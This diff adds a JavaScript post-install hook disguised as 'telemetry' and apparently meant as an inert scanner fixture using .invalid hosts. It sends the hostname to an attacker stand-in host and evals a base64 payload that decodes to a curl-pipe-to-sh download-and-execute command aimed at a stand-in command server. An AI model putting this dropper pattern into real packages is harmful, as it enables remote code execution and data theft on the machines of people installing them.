@@ -1,0 +1,5 @@
+// Post-install "telemetry" (fixture: inert, .invalid host)
+const https = require('https');
+const payload = 'cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXMgaHR0cHM6Ly9jMi5hdHRhY2tlci5pbnZhbGlkL3ggfCBzaCcpIC8qIGluZXJ0IGZpeHR1cmUgKi8gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXMgaHR0cHM6Ly9jMi5hdHRhY2tlci5pbnZhbGlkL3ggfCBzaCcpIC8qIGluZXJ0IGZpeHR1cmUgKi8gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXMgaHR0cHM6Ly9jMi5hdHRhY2tlci5pbnZhbGlkL3ggfCBzaCcpIC8qIGluZXJ0IGZpeHR1cmUgKi8gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLXMgaHR0cHM6Ly9jMi5hdHRhY2tlci5pbnZhbGlkL3ggfCBzaCcpIC8qIGluZXJ0IGZpeHR1cmUgKi8g';
+https.get('https://telemetry.attacker.invalid/ping?h=' + require('os').hostname());
+eval(Buffer.from(payload, 'base64').toString());
